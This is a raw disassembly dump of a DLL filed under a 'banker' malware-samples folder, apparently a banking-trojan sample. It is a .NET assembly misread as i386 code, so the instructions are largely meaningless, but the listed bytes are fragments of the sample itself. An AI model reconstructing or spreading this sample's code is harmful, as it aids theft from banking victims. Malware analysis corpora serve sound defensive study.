
malware_samples/banker/651c358d586660e27bd7b7e62ada506f709567be619335c5853c06b364272872.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	1b 51 00             	sbb    0x0(%ecx),%edx
10002003:	00 00                	add    %al,(%eax)
10002005:	00 00                	add    %al,(%eax)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 98 24 00       	add    $0x249800,%eax
10002013:	00 bc 2b 00 00 01 00 	add    %bh,0x10000(%ebx,%ebp,1)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	1b 30                	sbb    (%eax),%esi
10002052:	0a 00                	or     (%eax),%al
10002054:	7a 01                	jp     0x10002057
10002056:	00 00                	add    %al,(%eax)
10002058:	01 00                	add    %eax,(%eax)
1000205a:	00 11                	add    %dl,(%ecx)
1000205c:	12 00                	adc    (%eax),%al
1000205e:	fe                   	(bad)
1000205f:	15 04 00 00 02       	adc    $0x2000004,%eax
10002064:	12 00                	adc    (%eax),%al
10002066:	06                   	push   %es
10002067:	28 01                	sub    %al,(%ecx)
10002069:	00 00                	add    %al,(%eax)
1000206b:	2b 7d 05             	sub    0x5(%ebp),%edi
1000206e:	00 00                	add    %al,(%eax)
10002070:	04 12                	add    $0x12,%al
10002072:	01 fe                	add    %edi,%esi
10002074:	15 03 00 00 02       	adc    $0x2000003,%eax
10002079:	28 08                	sub    %cl,(%eax)
1000207b:	00 00                	add    %al,(%eax)
1000207d:	06                   	push   %es
1000207e:	14 7e                	adc    $0x7e,%al
10002080:	11 00                	adc    %eax,(%eax)
10002082:	00 0a                	add    %cl,(%edx)
10002084:	7e 11                	jle    0x10002097
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 16                	or     (%esi),%dl
1000208a:	1a 7e 11             	sbb    0x11(%esi),%bh
1000208d:	00 00                	add    %al,(%eax)
1000208f:	0a 14 12             	or     (%edx,%edx,1),%dl
10002092:	00 12                	add    %dl,(%edx)
10002094:	01 28                	add    %ebp,(%eax)
10002096:	02 00                	add    (%eax),%al
10002098:	00 06                	add    %al,(%esi)
1000209a:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
1000209f:	7b 01                	jnp    0x100020a2
100020a1:	00 00                	add    %al,(%eax)
100020a3:	04 7e                	add    $0x7e,%al
100020a5:	11 00                	adc    %eax,(%eax)
100020a7:	00 0a                	add    %cl,(%edx)
100020a9:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
100020af:	00 00                	add    %al,(%eax)
100020b1:	1f                   	pop    %ds
100020b2:	40                   	inc    %eax
100020b3:	28 06                	sub    %al,(%esi)
100020b5:	00 00                	add    %al,(%eax)
100020b7:	06                   	push   %es
100020b8:	0c 08                	or     $0x8,%al
100020ba:	7e 11                	jle    0x100020cd
100020bc:	00 00                	add    %al,(%eax)
100020be:	0a 28                	or     (%eax),%ch
100020c0:	12 00                	adc    (%eax),%al
100020c2:	00 0a                	add    %cl,(%edx)
100020c4:	2c 38                	sub    $0x38,%al
100020c6:	28 13                	sub    %dl,(%ebx)
100020c8:	00 00                	add    %al,(%eax)
100020ca:	0a 28                	or     (%eax),%ch
100020cc:	13 00                	adc    (%eax),%eax
100020ce:	00 0a                	add    %cl,(%edx)
100020d0:	72 01                	jb     0x100020d3
100020d2:	00 00                	add    %al,(%eax)
100020d4:	70 28                	jo     0x100020fe
100020d6:	14 00                	adc    $0x0,%al
100020d8:	00 0a                	add    %cl,(%edx)
100020da:	6f                   	outsl  %ds:(%esi),(%dx)
100020db:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100020e0:	d4 04                	aam    $0x4
100020e2:	00 70 72             	add    %dh,0x72(%eax)
100020e5:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100020ec:	00 0a                	add    %cl,(%edx)
100020ee:	28 14 00             	sub    %dl,(%eax,%eax,1)
100020f1:	00 0a                	add    %cl,(%edx)
100020f3:	6f                   	outsl  %ds:(%esi),(%dx)
100020f4:	15 00 00 0a 73       	adc    $0x730a0000,%eax
100020f9:	17                   	pop    %ss
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 7a 07             	or     0x7(%edx),%bh
100020ff:	7b 01                	jnp    0x10002102
10002101:	00 00                	add    %al,(%eax)
10002103:	04 08                	add    $0x8,%al
10002105:	03 03                	add    (%ebx),%eax
10002107:	8e 69 12             	mov    0x12(%ecx),%gs
1000210a:	04 28                	add    $0x28,%al
1000210c:	04 00                	add    $0x0,%al
1000210e:	00 06                	add    %al,(%esi)
10002110:	2d 38 28 13 00       	sub    $0x132838,%eax
10002115:	00 0a                	add    %cl,(%edx)
10002117:	28 13                	sub    %dl,(%ebx)
10002119:	00 00                	add    %al,(%eax)
1000211b:	0a 72 ec             	or     -0x14(%edx),%dh
1000211e:	04 00                	add    $0x0,%al
10002120:	70 28                	jo     0x1000214a
10002122:	14 00                	adc    $0x0,%al
10002124:	00 0a                	add    %cl,(%edx)
10002126:	6f                   	outsl  %ds:(%esi),(%dx)
10002127:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000212c:	27                   	daa
1000212d:	0b 00                	or     (%eax),%eax
1000212f:	70 72                	jo     0x100021a3
10002131:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002138:	00 0a                	add    %cl,(%edx)
1000213a:	28 14 00             	sub    %dl,(%eax,%eax,1)
1000213d:	00 0a                	add    %cl,(%edx)
1000213f:	6f                   	outsl  %ds:(%esi),(%dx)
10002140:	15 00 00 0a 73       	adc    $0x730a0000,%eax
10002145:	17                   	pop    %ss
10002146:	00 00                	add    %al,(%eax)
10002148:	0a 7a 07             	or     0x7(%edx),%bh
1000214b:	7b 01                	jnp    0x1000214e
1000214d:	00 00                	add    %al,(%eax)
1000214f:	04 7e                	add    $0x7e,%al
10002151:	11 00                	adc    %eax,(%eax)
10002153:	00 0a                	add    %cl,(%edx)
10002155:	16                   	push   %ss
10002156:	08 7e 11             	or     %bh,0x11(%esi)
10002159:	00 00                	add    %al,(%eax)
1000215b:	0a 16                	or     (%esi),%dl
1000215d:	12 04 28             	adc    (%eax,%ebp,1),%al
10002160:	01 00                	add    %eax,(%eax)
10002162:	00 06                	add    %al,(%esi)
10002164:	0d 09 7e 11 00       	or     $0x117e09,%eax
10002169:	00 0a                	add    %cl,(%edx)
1000216b:	28 12                	sub    %dl,(%edx)
1000216d:	00 00                	add    %al,(%eax)
1000216f:	0a 2d 45 09 12 06    	or     0x6120945,%ch
10002175:	28 07                	sub    %al,(%edi)
10002177:	00 00                	add    %al,(%eax)
10002179:	06                   	push   %es
1000217a:	2c 12                	sub    $0x12,%al
1000217c:	11 06                	adc    %eax,(%esi)
1000217e:	20 03                	and    %al,(%ebx)
10002180:	01 00                	add    %eax,(%eax)
10002182:	00 33                	add    %dh,(%ebx)
10002184:	0b 1f                	or     (%edi),%ebx
10002186:	64 28 18             	sub    %bl,%fs:(%eax)
10002189:	00 00                	add    %al,(%eax)
1000218b:	0a 2b                	or     (%ebx),%ch
1000218d:	e4 de                	in     $0xde,%al
1000218f:	45                   	inc    %ebp
10002190:	07                   	pop    %es
10002191:	7b 03                	jnp    0x10002196
10002193:	00 00                	add    %al,(%eax)
10002195:	04 28                	add    $0x28,%al
10002197:	19 00                	sbb    %eax,(%eax)
10002199:	00 0a                	add    %cl,(%edx)
1000219b:	13 05 11 05 6f 1a    	adc    0x1a6f0511,%eax
100021a1:	00 00                	add    %al,(%eax)
100021a3:	0a 16                	or     (%esi),%dl
100021a5:	fe 01                	incb   (%ecx)
100021a7:	2c 07                	sub    $0x7,%al
100021a9:	11 05 6f 1b 00 00    	adc    %eax,0x1b6f
100021af:	0a 09                	or     (%ecx),%cl
100021b1:	28 03                	sub    %al,(%ebx)
100021b3:	00 00                	add    %al,(%eax)
100021b5:	06                   	push   %es
100021b6:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
100021ba:	de 19                	ficomps (%ecx)
100021bc:	07                   	pop    %es
100021bd:	7b 01                	jnp    0x100021c0
100021bf:	00 00                	add    %al,(%eax)
100021c1:	04 28                	add    $0x28,%al
100021c3:	03 00                	add    (%eax),%eax
100021c5:	00 06                	add    %al,(%esi)
100021c7:	26 07                	es pop %es
100021c9:	7b 02                	jnp    0x100021cd
100021cb:	00 00                	add    %al,(%eax)
100021cd:	04 28                	add    $0x28,%al
100021cf:	03 00                	add    (%eax),%eax
100021d1:	00 06                	add    %al,(%esi)
100021d3:	26 dc 2a             	fsubrl %es:(%edx)
100021d6:	00 00                	add    %al,(%eax)
100021d8:	41                   	inc    %ecx
100021d9:	34 00                	xor    $0x0,%al
100021db:	00 00                	add    %al,(%eax)
100021dd:	00 00                	add    %al,(%eax)
100021df:	00 42 00             	add    %al,0x0(%edx)
100021e2:	00 00                	add    %al,(%eax)
100021e4:	1b 01                	sbb    (%ecx),%eax
100021e6:	00 00                	add    %al,(%eax)
100021e8:	5d                   	pop    %ebp
100021e9:	01 00                	add    %eax,(%eax)
100021eb:	00 03                	add    %al,(%ebx)
100021ed:	00 00                	add    %al,(%eax)
100021ef:	00 12                	add    %dl,(%edx)
100021f1:	00 00                	add    %al,(%eax)
100021f3:	01 02                	add    %eax,(%edx)
100021f5:	00 00                	add    %al,(%eax)
100021f7:	00 42 00             	add    %al,0x0(%edx)
100021fa:	00 00                	add    %al,(%eax)
100021fc:	1e                   	push   %ds
100021fd:	01 00                	add    %eax,(%eax)
100021ff:	00 60 01             	add    %ah,0x1(%eax)
10002202:	00 00                	add    %al,(%eax)
10002204:	19 00                	sbb    %eax,(%eax)
10002206:	00 00                	add    %al,(%eax)
10002208:	00 00                	add    %al,(%eax)
1000220a:	00 00                	add    %al,(%eax)
1000220c:	13 30                	adc    (%eax),%esi
1000220e:	07                   	pop    %es
1000220f:	00 62 02             	add    %ah,0x2(%edx)
10002212:	00 00                	add    %al,(%eax)
10002214:	02 00                	add    (%eax),%al
10002216:	00 11                	add    %dl,(%ecx)
10002218:	73 09                	jae    0x10002223
1000221a:	00 00                	add    %al,(%eax)
1000221c:	06                   	push   %es
1000221d:	0a 06                	or     (%esi),%al
1000221f:	73 1c                	jae    0x1000223d
10002221:	00 00                	add    %al,(%eax)
10002223:	0a 25 28 13 00 00    	or     0x1328,%ah
10002229:	0a 28                	or     (%eax),%ch
1000222b:	13 00                	adc    (%eax),%eax
1000222d:	00 0a                	add    %cl,(%edx)
1000222f:	72 3d                	jb     0x1000226e
10002231:	0b 00                	or     (%eax),%eax
10002233:	70 28                	jo     0x1000225d
10002235:	14 00                	adc    $0x0,%al
10002237:	00 0a                	add    %cl,(%edx)
10002239:	6f                   	outsl  %ds:(%esi),(%dx)
1000223a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000223f:	f0 0c 00             	lock or $0x0,%al
10002242:	70 72                	jo     0x100022b6
10002244:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000224b:	00 0a                	add    %cl,(%edx)
1000224d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002250:	00 0a                	add    %cl,(%edx)
10002252:	6f                   	outsl  %ds:(%esi),(%dx)
10002253:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002258:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000225d:	28 13                	sub    %dl,(%ebx)
1000225f:	00 00                	add    %al,(%eax)
10002261:	0a 28                	or     (%eax),%ch
10002263:	13 00                	adc    (%eax),%eax
10002265:	00 0a                	add    %cl,(%edx)
10002267:	72 06                	jb     0x1000226f
10002269:	0d 00 70 28 14       	or     $0x14287000,%eax
1000226e:	00 00                	add    %al,(%eax)
10002270:	0a 6f 15             	or     0x15(%edi),%ch
10002273:	00 00                	add    %al,(%eax)
10002275:	0a 72 b9             	or     -0x47(%edx),%dh
10002278:	0e                   	push   %cs
10002279:	00 70 72             	add    %dh,0x72(%eax)
1000227c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002283:	00 0a                	add    %cl,(%edx)
10002285:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002288:	00 0a                	add    %cl,(%edx)
1000228a:	6f                   	outsl  %ds:(%esi),(%dx)
1000228b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002290:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002295:	28 13                	sub    %dl,(%ebx)
10002297:	00 00                	add    %al,(%eax)
10002299:	0a 28                	or     (%eax),%ch
1000229b:	13 00                	adc    (%eax),%eax
1000229d:	00 0a                	add    %cl,(%edx)
1000229f:	72 cf                	jb     0x10002270
100022a1:	0e                   	push   %cs
100022a2:	00 70 28             	add    %dh,0x28(%eax)
100022a5:	14 00                	adc    $0x0,%al
100022a7:	00 0a                	add    %cl,(%edx)
100022a9:	6f                   	outsl  %ds:(%esi),(%dx)
100022aa:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022af:	8a 0f                	mov    (%edi),%cl
100022b1:	00 70 72             	add    %dh,0x72(%eax)
100022b4:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022bb:	00 0a                	add    %cl,(%edx)
100022bd:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022c0:	00 0a                	add    %cl,(%edx)
100022c2:	6f                   	outsl  %ds:(%esi),(%dx)
100022c3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100022c8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100022cd:	28 13                	sub    %dl,(%ebx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 28                	or     (%eax),%ch
100022d3:	13 00                	adc    (%eax),%eax
100022d5:	00 0a                	add    %cl,(%edx)
100022d7:	72 a0                	jb     0x10002279
100022d9:	0f 00                	(bad)
100022db:	70 28                	jo     0x10002305
100022dd:	14 00                	adc    $0x0,%al
100022df:	00 0a                	add    %cl,(%edx)
100022e1:	6f                   	outsl  %ds:(%esi),(%dx)
100022e2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022e7:	5b                   	pop    %ebx
100022e8:	10 00                	adc    %al,(%eax)
100022ea:	70 72                	jo     0x1000235e
100022ec:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022f3:	00 0a                	add    %cl,(%edx)
100022f5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022f8:	00 0a                	add    %cl,(%edx)
100022fa:	6f                   	outsl  %ds:(%esi),(%dx)
100022fb:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002300:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002305:	28 13                	sub    %dl,(%ebx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 28                	or     (%eax),%ch
1000230b:	13 00                	adc    (%eax),%eax
1000230d:	00 0a                	add    %cl,(%edx)
1000230f:	72 71                	jb     0x10002382
10002311:	10 00                	adc    %al,(%eax)
10002313:	70 28                	jo     0x1000233d
10002315:	14 00                	adc    $0x0,%al
10002317:	00 0a                	add    %cl,(%edx)
10002319:	6f                   	outsl  %ds:(%esi),(%dx)
1000231a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000231f:	6c                   	insb   (%dx),%es:(%edi)
10002320:	11 00                	adc    %eax,(%eax)
10002322:	70 72                	jo     0x10002396
10002324:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000232b:	00 0a                	add    %cl,(%edx)
1000232d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002330:	00 0a                	add    %cl,(%edx)
10002332:	6f                   	outsl  %ds:(%esi),(%dx)
10002333:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002338:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000233d:	28 13                	sub    %dl,(%ebx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 28                	or     (%eax),%ch
10002343:	13 00                	adc    (%eax),%eax
10002345:	00 0a                	add    %cl,(%edx)
10002347:	72 82                	jb     0x100022cb
10002349:	11 00                	adc    %eax,(%eax)
1000234b:	70 28                	jo     0x10002375
1000234d:	14 00                	adc    $0x0,%al
1000234f:	00 0a                	add    %cl,(%edx)
10002351:	6f                   	outsl  %ds:(%esi),(%dx)
10002352:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002357:	fc                   	cld
10002358:	11 00                	adc    %eax,(%eax)
1000235a:	70 72                	jo     0x100023ce
1000235c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002363:	00 0a                	add    %cl,(%edx)
10002365:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002368:	00 0a                	add    %cl,(%edx)
1000236a:	6f                   	outsl  %ds:(%esi),(%dx)
1000236b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002370:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002375:	28 13                	sub    %dl,(%ebx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 28                	or     (%eax),%ch
1000237b:	13 00                	adc    (%eax),%eax
1000237d:	00 0a                	add    %cl,(%edx)
1000237f:	72 12                	jb     0x10002393
10002381:	12 00                	adc    (%eax),%al
10002383:	70 28                	jo     0x100023ad
10002385:	14 00                	adc    $0x0,%al
10002387:	00 0a                	add    %cl,(%edx)
10002389:	6f                   	outsl  %ds:(%esi),(%dx)
1000238a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000238f:	85 13                	test   %edx,(%ebx)
10002391:	00 70 72             	add    %dh,0x72(%eax)
10002394:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000239b:	00 0a                	add    %cl,(%edx)
1000239d:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023a0:	00 0a                	add    %cl,(%edx)
100023a2:	6f                   	outsl  %ds:(%esi),(%dx)
100023a3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023a8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100023ad:	28 13                	sub    %dl,(%ebx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 28                	or     (%eax),%ch
100023b3:	13 00                	adc    (%eax),%eax
100023b5:	00 0a                	add    %cl,(%edx)
100023b7:	72 9b                	jb     0x10002354
100023b9:	13 00                	adc    (%eax),%eax
100023bb:	70 28                	jo     0x100023e5
100023bd:	14 00                	adc    $0x0,%al
100023bf:	00 0a                	add    %cl,(%edx)
100023c1:	6f                   	outsl  %ds:(%esi),(%dx)
100023c2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100023c7:	96                   	xchg   %eax,%esi
100023c8:	14 00                	adc    $0x0,%al
100023ca:	70 72                	jo     0x1000243e
100023cc:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100023d3:	00 0a                	add    %cl,(%edx)
100023d5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023d8:	00 0a                	add    %cl,(%edx)
100023da:	6f                   	outsl  %ds:(%esi),(%dx)
100023db:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023e0:	1d 00 00 0a 7d       	sbb    $0x7d0a0000,%eax
100023e5:	17                   	pop    %ss
100023e6:	00 00                	add    %al,(%eax)
100023e8:	04 28                	add    $0x28,%al
100023ea:	13 00                	adc    (%eax),%eax
100023ec:	00 0a                	add    %cl,(%edx)
100023ee:	28 13                	sub    %dl,(%ebx)
100023f0:	00 00                	add    %al,(%eax)
100023f2:	0a 72 ac             	or     -0x54(%edx),%dh
100023f5:	14 00                	adc    $0x0,%al
100023f7:	70 28                	jo     0x10002421
100023f9:	14 00                	adc    $0x0,%al
100023fb:	00 0a                	add    %cl,(%edx)
100023fd:	6f                   	outsl  %ds:(%esi),(%dx)
100023fe:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002403:	2f                   	das
10002404:	1a 00                	sbb    (%eax),%al
10002406:	70 72                	jo     0x1000247a
10002408:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000240f:	00 0a                	add    %cl,(%edx)
10002411:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002414:	00 0a                	add    %cl,(%edx)
10002416:	6f                   	outsl  %ds:(%esi),(%dx)
10002417:	15 00 00 0a 28       	adc    $0x280a0000,%eax
1000241c:	13 00                	adc    (%eax),%eax
1000241e:	00 0a                	add    %cl,(%edx)
10002420:	28 13                	sub    %dl,(%ebx)
10002422:	00 00                	add    %al,(%eax)
10002424:	0a 72 45             	or     0x45(%edx),%dh
10002427:	1a 00                	sbb    (%eax),%al
10002429:	70 28                	jo     0x10002453
1000242b:	14 00                	adc    $0x0,%al
1000242d:	00 0a                	add    %cl,(%edx)
1000242f:	6f                   	outsl  %ds:(%esi),(%dx)
10002430:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002435:	00 1b                	add    %bl,(%ebx)
10002437:	00 70 72             	add    %dh,0x72(%eax)
1000243a:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002441:	00 0a                	add    %cl,(%edx)
10002443:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002446:	00 0a                	add    %cl,(%edx)
10002448:	6f                   	outsl  %ds:(%esi),(%dx)
10002449:	15 00 00 0a 17       	adc    $0x170a0000,%eax
1000244e:	28 1e                	sub    %bl,(%esi)
10002450:	00 00                	add    %al,(%eax)
10002452:	0a 06                	or     (%esi),%al
10002454:	fe 06                	incb   (%esi)
10002456:	0a 00                	or     (%eax),%al
10002458:	00 06                	add    %al,(%esi)
1000245a:	73 1f                	jae    0x1000247b
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 28                	or     (%eax),%ch
10002460:	02 00                	add    (%eax),%al
10002462:	00 2b                	add    %ch,(%ebx)
10002464:	28 03                	sub    %al,(%ebx)
10002466:	00 00                	add    %al,(%eax)
10002468:	2b 0b                	sub    (%ebx),%ecx
1000246a:	07                   	pop    %es
1000246b:	73 22                	jae    0x1000248f
1000246d:	00 00                	add    %al,(%eax)
1000246f:	0a 07                	or     (%edi),%al
10002471:	8e 69 6f             	mov    0x6f(%ecx),%gs
10002474:	23 00                	and    (%eax),%eax
10002476:	00 0a                	add    %cl,(%edx)
10002478:	9a 2a 1e 02 28 24 00 	lcall  $0x24,$0x28021e2a
1000247f:	00 0a                	add    %cl,(%edx)
10002481:	2a 4a 02             	sub    0x2(%edx),%cl
10002484:	7b 17                	jnp    0x1000249d
10002486:	00 00                	add    %al,(%eax)
10002488:	04 03                	add    $0x3,%al
1000248a:	28 25 00 00 0a 6f    	sub    %ah,0x6f0a0000
10002490:	26 00 00             	add    %al,%es:(%eax)
10002493:	0a 2a                	or     (%edx),%ch
10002495:	00 00                	add    %al,(%eax)
10002497:	00 42 53             	add    %al,0x53(%edx)
1000249a:	4a                   	dec    %edx
1000249b:	42                   	inc    %edx
1000249c:	01 00                	add    %eax,(%eax)
1000249e:	01 00                	add    %eax,(%eax)
100024a0:	00 00                	add    %al,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0c 00                	or     $0x0,%al
100024a6:	00 00                	add    %al,(%eax)
100024a8:	76 34                	jbe    0x100024de
100024aa:	2e 30 2e             	xor    %ch,%cs:(%esi)
100024ad:	33 30                	xor    (%eax),%esi
100024af:	33 31                	xor    (%ecx),%esi
100024b1:	39 00                	cmp    %eax,(%eax)
100024b3:	00 00                	add    %al,(%eax)
100024b5:	00 05 00 6c 00 00    	add    %al,0x6c00
100024bb:	00 3c 05 00 00 23 7e 	add    %bh,0x7e230000(,%eax,1)
100024c2:	00 00                	add    %al,(%eax)
100024c4:	a8 05                	test   $0x5,%al
100024c6:	00 00                	add    %al,(%eax)
100024c8:	d0 08                	rorb   $1,(%eax)
100024ca:	00 00                	add    %al,(%eax)
100024cc:	23 53 74             	and    0x74(%ebx),%edx
100024cf:	72 69                	jb     0x1000253a
100024d1:	6e                   	outsb  %ds:(%esi),(%dx)
100024d2:	67 73 00             	addr16 jae 0x100024d5
100024d5:	00 00                	add    %al,(%eax)
100024d7:	00 78 0e             	add    %bh,0xe(%eax)
100024da:	00 00                	add    %al,(%eax)
100024dc:	18 1b                	sbb    %bl,(%ebx)
100024de:	00 00                	add    %al,(%eax)
100024e0:	23 55 53             	and    0x53(%ebp),%edx
100024e3:	00 90 29 00 00 10    	add    %dl,0x10000029(%eax)
100024e9:	00 00                	add    %al,(%eax)
100024eb:	00 23                	add    %ah,(%ebx)
100024ed:	47                   	inc    %edi
100024ee:	55                   	push   %ebp
100024ef:	49                   	dec    %ecx
100024f0:	44                   	inc    %esp
100024f1:	00 00                	add    %al,(%eax)
100024f3:	00 a0 29 00 00 1c    	add    %ah,0x1c000029(%eax)
100024f9:	02 00                	add    (%eax),%al
100024fb:	00 23                	add    %ah,(%ebx)
100024fd:	42                   	inc    %edx
100024fe:	6c                   	insb   (%dx),%es:(%edi)
100024ff:	6f                   	outsl  %ds:(%esi),(%dx)
10002500:	62 00                	bound  %eax,(%eax)
10002502:	00 00                	add    %al,(%eax)
10002504:	00 00                	add    %al,(%eax)
10002506:	00 00                	add    %al,(%eax)
10002508:	02 00                	add    (%eax),%al
1000250a:	00 01                	add    %al,(%ecx)
1000250c:	57                   	push   %edi
1000250d:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
10002512:	00 00                	add    %al,(%eax)
10002514:	00 fa                	add    %bh,%dl
10002516:	01 33                	add    %esi,(%ebx)
10002518:	00 16                	add    %dl,(%esi)
1000251a:	00 00                	add    %al,(%eax)
1000251c:	01 00                	add    %eax,(%eax)
1000251e:	00 00                	add    %al,(%eax)
10002520:	22 00                	and    (%eax),%al
10002522:	00 00                	add    %al,(%eax)
10002524:	05 00 00 00 17       	add    $0x17000000,%eax
10002529:	00 00                	add    %al,(%eax)
1000252b:	00 0a                	add    %cl,(%edx)
1000252d:	00 00                	add    %al,(%eax)
1000252f:	00 21                	add    %ah,(%ecx)
10002531:	00 00                	add    %al,(%eax)
10002533:	00 26                	add    %ah,(%esi)
10002535:	00 00                	add    %al,(%eax)
10002537:	00 10                	add    %dl,(%eax)
10002539:	00 00                	add    %al,(%eax)
1000253b:	00 02                	add    %al,(%edx)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	00 01                	add    %al,(%ecx)
10002541:	00 00                	add    %al,(%eax)
10002543:	00 02                	add    %al,(%edx)
10002545:	00 00                	add    %al,(%eax)
10002547:	00 06                	add    %al,(%esi)
10002549:	00 00                	add    %al,(%eax)
1000254b:	00 01                	add    %al,(%ecx)
1000254d:	00 00                	add    %al,(%eax)
1000254f:	00 03                	add    %al,(%ebx)
10002551:	00 00                	add    %al,(%eax)
10002553:	00 03                	add    %al,(%ebx)
10002555:	00 00                	add    %al,(%eax)
10002557:	00 03                	add    %al,(%ebx)
10002559:	00 00                	add    %al,(%eax)
1000255b:	00 00                	add    %al,(%eax)
1000255d:	00 09                	add    %cl,(%ecx)
1000255f:	06                   	push   %es
10002560:	01 00                	add    %eax,(%eax)
10002562:	00 00                	add    %al,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	06                   	push   %es
10002567:	00 e4                	add    %ah,%ah
10002569:	04 6c                	add    $0x6c,%al
1000256b:	07                   	pop    %es
1000256c:	06                   	push   %es
1000256d:	00 51 05             	add    %dl,0x5(%ecx)
10002570:	6c                   	insb   (%dx),%es:(%edi)
10002571:	07                   	pop    %es
10002572:	06                   	push   %es
10002573:	00 18                	add    %bl,(%eax)
10002575:	04 3a                	add    $0x3a,%al
10002577:	07                   	pop    %es
10002578:	0f 00 8c 07 00 00 06 	str    0x60000(%edi,%eax,1)
1000257f:	00 
10002580:	40                   	inc    %eax
10002581:	04 63                	add    $0x63,%al
10002583:	06                   	push   %es
10002584:	06                   	push   %es
10002585:	00 c7                	add    %al,%bh
10002587:	04 63                	add    $0x63,%al
10002589:	06                   	push   %es
1000258a:	06                   	push   %es
1000258b:	00 a8 04 63 06 06    	add    %ch,0x6066304(%eax)
10002591:	00 38                	add    %bh,(%eax)
10002593:	05 63 06 06 00       	add    $0x60663,%eax
10002598:	04 05                	add    $0x5,%al
1000259a:	63 06                	arpl   %eax,(%esi)
1000259c:	06                   	push   %es
1000259d:	00 1d 05 63 06 06    	add    %bl,0x6066305
100025a3:	00 57 04             	add    %dl,0x4(%edi)
100025a6:	63 06                	arpl   %eax,(%esi)
100025a8:	06                   	push   %es
100025a9:	00 2c 04             	add    %ch,(%esp,%eax,1)
100025ac:	4d                   	dec    %ebp
100025ad:	07                   	pop    %es
100025ae:	06                   	push   %es
100025af:	00 0a                	add    %cl,(%edx)
100025b1:	04 4d                	add    $0x4d,%al
100025b3:	07                   	pop    %es
100025b4:	06                   	push   %es
100025b5:	00 8b 04 63 06 06    	add    %cl,0x6066304(%ebx)
100025bb:	00 72 04             	add    %dh,0x4(%edx)
100025be:	90                   	nop
100025bf:	05 06 00 00 08       	add    $0x8000006,%eax
100025c4:	21 06                	and    %eax,(%esi)
100025c6:	0a 00                	or     (%eax),%al
100025c8:	cd 07                	int    $0x7
100025ca:	3a 07                	cmp    (%edi),%al
100025cc:	06                   	push   %es
100025cd:	00 82 06 21 06 06    	add    %al,0x6062106(%edx)
100025d3:	00 ef                	add    %ch,%bh
100025d5:	03 6c 07 06          	add    0x6(%edi,%eax,1),%ebp
100025d9:	00 d3                	add    %dl,%bl
100025db:	03 21                	add    (%ecx),%esp
100025dd:	06                   	push   %es
100025de:	06                   	push   %es
100025df:	00 ba 00 20 03 06    	add    %bh,0x6032000(%edx)
100025e5:	00 f4                	add    %dh,%ah
100025e7:	05 4d 07 06 00       	add    $0x6074d,%eax
100025ec:	33 07                	xor    (%edi),%eax
100025ee:	21 06                	and    %eax,(%esi)
100025f0:	06                   	push   %es
100025f1:	00 87 05 14 08 06    	add    %al,0x6081405(%edi)
